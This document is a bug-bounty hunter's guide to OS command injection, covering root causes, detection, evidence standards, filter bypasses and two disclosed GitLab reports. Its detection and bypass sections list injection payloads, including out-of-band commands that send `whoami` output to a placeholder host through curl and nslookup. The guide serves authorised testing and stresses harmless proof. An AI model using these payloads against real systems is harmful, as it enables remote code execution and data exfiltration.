# OS Command Injection

> User input reaches a shell. Classic, blind, and argument-injection variants. Top payout because the endpoint is proof of RCE — the end of most chains.

## Root cause
The app concatenates input into a string handed to a shell (`sh -c`, `system`, `exec`, backticks,
`child_process.exec`, `Runtime.exec` with a shell, `os.system`). Shell metacharacters
(`;`, `|`, `&`, `$()`, backticks, newline) break out of the intended command. A quieter cousin:
**argument injection**, where input can't reach a shell but *can* add flags to a binary
(`--output`, `-o`, `--use-compress-program`, `-exec`), which is exploitable without any metacharacter.

## Where it hides
- Anything invoking a CLI tool: image/PDF/video conversion (ImageMagick, ffmpeg, gs, LibreOffice),
  DNS/ping/traceroute "network tools", git operations, backup/export, `zip`/`tar`, `curl`/`wget`.
- Filename and archive-member handling passed to a shell.
- SSRF/webhook features that shell out to `curl`.
- SSTI and deserialization sinks that ultimately call a shell.
- Admin/diagnostic endpoints ("run health check", "clear cache").

## Detection
- Inline: `; id`, `| id`, `$(id)`, `` `id` ``, `%0aid`. Look for command output in the response.
- Blind (no output): out-of-band is the reliable oracle. `$(curl http://OOB/$(whoami))` or
  `; nslookup $(whoami).OOB` — the DNS/HTTP hit *with exfiltrated data in the subdomain* is proof.
- Time-based fallback: `; sleep 10`, `& ping -c 10 127.0.0.1` — measure the delta across repeats.
- Argument injection: try `-`-prefixed input; test if a value becomes a flag (e.g. filename `-o/tmp/x`).

## Minimum-evidence bar
Command execution demonstrated: command output in the body, OR an out-of-band callback you control
carrying data only the server could produce (`whoami`, hostname). A hung/slow request alone is weak —
back time-based with repeatable deltas *and* an OOB confirm where possible. Prove execution with one
harmless command (`id`), then stop. Never read `/etc/shadow`, pivot, or run destructive commands.

## Depth ladder
1. Reflected output injection (`;id`).
2. Blind OOB with data exfil in the callback hostname.
3. Argument injection → file write / read via tool flags (no metacharacters needed).
4. Full command context → reverse shell *only if scope explicitly permits*; otherwise stop at proof.
See `../payloads/command-injection.md`.

## Bypass notes
- Metacharacters filtered: use `${IFS}` for spaces, `$@`, brace expansion, `\` line continuation,
  hex/`$'\x20'`, or newline `%0a`. Blocklisted words → `w'h'o'a'm'i`, `$(rev<<<imaohw)`.
- No spaces allowed → `{cat,/etc/hostname}` or `<` redirection.
- Output stripped → go blind/OOB. See `../bypass-tables.md`.

## Chain potential
CMDi is usually the *endpoint* of a chain (SSRF→internal tool, file-upload→processing, SSTI→shell).
From RCE: read cloud creds / env → infra takeover. See `../../references/chaining.md`.

## Real paid example
Real disclosed reports:
- **RCE when removing metadata with ExifTool** (GitLab, $20000) — hackerone.com/reports/1154542 — malicious image/DjVu metadata reached an ExifTool shell context (CVE-2021-22204).
- **Git flag injection - local file overwrite to remote code execution** (GitLab, $12000) — hackerone.com/reports/658013 — attacker input became a `git` command-line flag (argument injection), no shell metacharacter needed.

**The recurring tell:** user input reaches a CLI invocation — a converter, a metadata stripper, a `git` call — either as a shell string (metacharacters break out) or as a bare argument the binary reads as a flag.

## Rejected variants
- `sleep` delta with no OOB and no output on a jittery endpoint — inconclusive, keep hunting.
- Metacharacters reflected into a response but executed through a parameterized `execFile`/array
  argv with no shell — not injectable.
- "Command runs but only on my own sandboxed container with no data/impact" — prove reach or drop it.
- Self-inflicted execution on a client-side/local tool.
